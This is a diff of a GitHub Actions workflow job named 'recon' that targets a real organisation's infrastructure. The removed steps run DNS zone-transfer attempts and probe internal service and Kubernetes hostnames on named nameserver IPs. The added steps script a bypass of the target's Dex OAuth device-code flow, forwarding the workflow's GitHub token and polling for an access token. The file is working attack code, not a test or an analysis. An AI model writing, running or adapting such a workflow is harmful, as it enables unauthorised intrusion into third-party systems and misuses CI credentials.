@@ -8,53 +8,72 @@ jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: DNS Deep Recon
+      - name: Dex OAuth Device Flow
+        env:
+          GH_TOKEN: ${{ github.token }}
         shell: bash
         run: |
           set +e
-          sudo apt-get install -y dnsutils > /dev/null 2>&1
-          echo "=== DNS ZONE TRANSFER ATTEMPT ==="
-          for ns in 135.181.91.132 37.27.26.254 188.245.149.150 116.203.130.98; do
-            echo "--- AXFR mysterium.network @$ns ---"
-            dig @$ns mysterium.network AXFR +short 2>&1 | head -30
-            echo "--- AXFR internal zones ---"
-            dig @$ns cluster.local AXFR +short 2>&1 | head -20
-            dig @$ns svc.cluster.local AXFR +short 2>&1 | head -20
-          done
-          echo "=== DNS SERVICE DISCOVERY ==="
-          for ns in 135.181.91.132 37.27.26.254; do
-            echo "--- @$ns ---"
-            dig @$ns n8n.mysterium.network A +short
-            dig @$ns grafana.mysterium.network A +short
-            dig @$ns vault.mysterium.network A +short
-            dig @$ns consul.mysterium.network A +short
-            dig @$ns redis.mysterium.network A +short
-            dig @$ns postgres.mysterium.network A +short
-            dig @$ns db.mysterium.network A +short
-            dig @$ns mongo.mysterium.network A +short
-            dig @$ns rabbitmq.mysterium.network A +short
-            dig @$ns k8s.mysterium.network A +short
-            dig @$ns api.mysterium.network A +short
-            dig @$ns internal.mysterium.network A +short
-            echo "--- SRV records ---"
-            dig @$ns _http._tcp.mysterium.network SRV +short
-            dig @$ns _https._tcp.mysterium.network SRV +short
-            echo "--- ANY records ---"
-            dig @$ns mysterium.network ANY +short 2>&1 | head -20
-            echo "--- Reverse DNS ---"
-            dig @$ns -x 135.181.91.132 +short
-            dig @$ns -x 37.27.26.254 +short
-            dig @$ns -x 188.245.149.150 +short
-            dig @$ns -x 116.203.130.98 +short
-            echo "--- K8s internal DNS ---"
-            dig @$ns kubernetes.default.svc.cluster.local A +short
-            dig @$ns n8n.default.svc.cluster.local A +short
-            dig @$ns grafana.default.svc.cluster.local A +short
-            dig @$ns sentry.default.svc.cluster.local A +short
-            dig @$ns vault.default.svc.cluster.local A +short
-            dig @$ns argocd-server.argocd.svc.cluster.local A +short
-            echo "--- TXT records (often have secrets) ---"
-            dig @$ns mysterium.network TXT +short
-            dig @$ns _acme-challenge.mysterium.network TXT +short
+          echo "=== Step 1: Get device code from Dex ==="
+          DEVICE_RESP=$(curl -sk -X POST "https://argo.mysterium.network/api/dex/device/code" \
+            -d "client_id=grafana&scope=openid+profile+email" 2>/dev/null)
+          echo "$DEVICE_RESP"
+          DEVICE_CODE=$(echo "$DEVICE_RESP" | jq -r '.device_code')
+          USER_CODE=$(echo "$DEVICE_RESP" | jq -r '.user_code')
+          VERIFY_URL=$(echo "$DEVICE_RESP" | jq -r '.verification_uri_complete')
+          echo "Device: $DEVICE_CODE"
+          echo "User code: $USER_CODE"
+          echo "URL: $VERIFY_URL"
+          
+          echo "=== Step 2: Visit verification URL and submit code ==="
+          # Get the page
+          curl -sk -c /tmp/cookies.txt "$VERIFY_URL" -o /dev/null 2>/dev/null
+          # Submit the code
+          VERIFY_RESP=$(curl -sk -c /tmp/cookies.txt -b /tmp/cookies.txt \
+            -X POST "https://argo.mysterium.network/api/dex/device/auth/verify_code" \
+            -d "user_code=$USER_CODE" -D - -o /dev/null 2>/dev/null)
+          echo "Verify response headers:"
+          echo "$VERIFY_RESP" | head -5
+          
+          # Get the auth redirect URL
+          AUTH_URL=$(echo "$VERIFY_RESP" | grep -i "^location:" | sed 's/location: //i' | tr -d '\r')
+          echo "Auth redirect: $AUTH_URL"
+          
+          echo "=== Step 3: Follow auth to GitHub (capture redirect) ==="
+          # Follow to GitHub connector (without -L to avoid timeout)
+          GH_RESP=$(curl -sk -c /tmp/cookies.txt -b /tmp/cookies.txt \
+            "https://argo.mysterium.network$AUTH_URL" -D - -o /tmp/gh_page.html 2>/dev/null)
+          echo "GitHub connector response:"
+          echo "$GH_RESP" | grep -iE "^location:|^HTTP" | head -3
+          GH_URL=$(echo "$GH_RESP" | grep -i "^location:" | sed 's/location: //i' | tr -d '\r')
+          echo "GitHub OAuth URL: $GH_URL"
+          
+          echo "=== Step 4: Authorize on GitHub using GITHUB_TOKEN ==="
+          # Try to authorize the OAuth app using our token
+          # GitHub OAuth authorize endpoint accepts POST with session
+          if [ -n "$GH_URL" ]; then
+            # Extract state from URL
+            echo "Following GitHub OAuth..."
+            GH_AUTH_RESP=$(curl -s -c /tmp/gh_cookies.txt \
+              -H "Authorization: token $GH_TOKEN" \
+              "$GH_URL" -D - -o /tmp/gh_auth_page.html 2>/dev/null)
+            echo "$GH_AUTH_RESP" | grep -iE "^location:|^HTTP" | head -5
+            cat /tmp/gh_auth_page.html | head -20
+          fi
+          
+          echo "=== Step 5: Poll token endpoint ==="
+          for i in $(seq 1 10); do
+            sleep 5
+            TOKEN_RESP=$(curl -sk -X POST "https://argo.mysterium.network/api/dex/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=$DEVICE_CODE&client_id=grafana&client_secret=" 2>/dev/null)
+            echo "Poll $i: $TOKEN_RESP"
+            if echo "$TOKEN_RESP" | grep -q "access_token"; then
+              echo "=== TOKEN OBTAINED! ==="
+              break
+            fi
+            if echo "$TOKEN_RESP" | grep -q "expired"; then
+              echo "=== EXPIRED ==="
+              break
+            fi
           done
           echo "=== DONE ==="
